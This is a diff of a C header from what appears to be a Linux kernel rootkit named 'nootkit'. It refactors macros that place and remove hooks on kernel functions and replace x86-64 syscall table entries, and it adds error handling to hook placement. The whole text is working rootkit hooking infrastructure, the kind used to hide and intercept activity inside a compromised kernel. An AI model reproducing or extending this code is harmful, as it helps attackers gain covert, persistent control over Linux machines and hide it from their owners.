@@ -5,22 +5,26 @@
 
 #include "common.h"
 
-#define HOOK_DEFINE(module, target_name, target_ptr, hook)                  \
-static hook_restore hook_restore__##target_name = {0};                      \
-                                                                            \
-void module##_hook_set_##target_name(void)                                  \
-{                                                                           \
-    hook_set_store(target_ptr, hook, &hook_restore__##target_name);         \
-}                                                                           \
-                                                                            \
-void module##_hook_unset_##target_name(void)                                \
-{                                                                           \
-    hook_unset_restore(target_ptr, &hook_restore__##target_name);           \
+#define HOOK_DEFINE(module, target_name, target_ptr, hook)                      \
+static hook_restore hook_restore__##target_name = {0};                          \
+                                                                                \
+int module##_hook_enable_##target_name(void)                                    \
+{                                                                               \
+    int res = hook_set_store(target_ptr, hook, &hook_restore__##target_name);   \
+    if (res)                                                                    \
+        printk(KERN_ERR "nootkit: Failed to enable hook %s:%s",                 \
+            #module, #target_name);                                             \
+    return res;                                                                 \
+}                                                                               \
+                                                                                \
+void module##_hook_disable_##target_name(void)                                  \
+{                                                                               \
+    hook_unset_restore(target_ptr, &hook_restore__##target_name);               \
 }
 
 #define HOOK_EXTERN(module, target_name)        \
-void module##_hook_set_##target_name(void);     \
-void module##_hook_unset_##target_name(void);
+int module##_hook_enable_##target_name(void);   \
+void module##_hook_disable_##target_name(void);
 
 typedef struct view hook_restore;
 
@@ -46,7 +50,8 @@ void hook_unset(void *addr, hook_restore *restore);
 /// @param hook Hook function address
 /// @param restore Pointer to a view struct which will be updated to point to the persistent
 ///     restore context.
-void hook_set_store(void *target, void *hook, hook_restore *restore);
+/// @returns 0 on successful hook placement, or non-zero on restore buffer allocation failure.
+int hook_set_store(void *target, void *hook, hook_restore *restore);
 
 /// @brief Unset a hook set with `hook_set_store`.
 /// @param target Function address to unset a hook from.
@@ -57,22 +62,22 @@ void hook_unset_restore(void *target, hook_restore *restore);
 #define HOOK_X64_SYSCALL_DEFINE(module, target_name, syscall, hook)                 \
 long (*hook_original__x64_sys_##target_name)(const struct pt_regs *regs) = NULL;    \
                                                                                     \
-void module##_hook_set_##target_name(void)                                          \
+void module##_hook_enable_##target_name(void)                                       \
 {                                                                                   \
     hook_x64_syscall_set_store(syscall, (void*)hook,                                \
-        (void *)&hook_original__x64_sys_##target_name);                             \
+        (void **)&hook_original__x64_sys_##target_name);                            \
 }                                                                                   \
                                                                                     \
-void module##_hook_unset_##target_name(void)                                        \
+void module##_hook_disable_##target_name(void)                                      \
 {                                                                                   \
     hook_x64_syscall_unset_restore(syscall,                                         \
-        (void *)&hook_original__x64_sys_##target_name);                             \
+        (void **)&hook_original__x64_sys_##target_name);                            \
 }
 
 #define HOOK_X64_SYSCALL_EXTERN(module, target_name)                                \
 extern long (*hook_original__x64_sys_##target_name)(const struct pt_regs *regs);    \
-void module##_hook_set_##target_name(void);                                         \
-void module##_hook_unset_##target_name(void);
+void module##_hook_enable_##target_name(void);                                      \
+void module##_hook_disable_##target_name(void);
 
 /// @brief Replace a syscall table entry with a custom function.
 /// @param syscall Syscall number to hook.
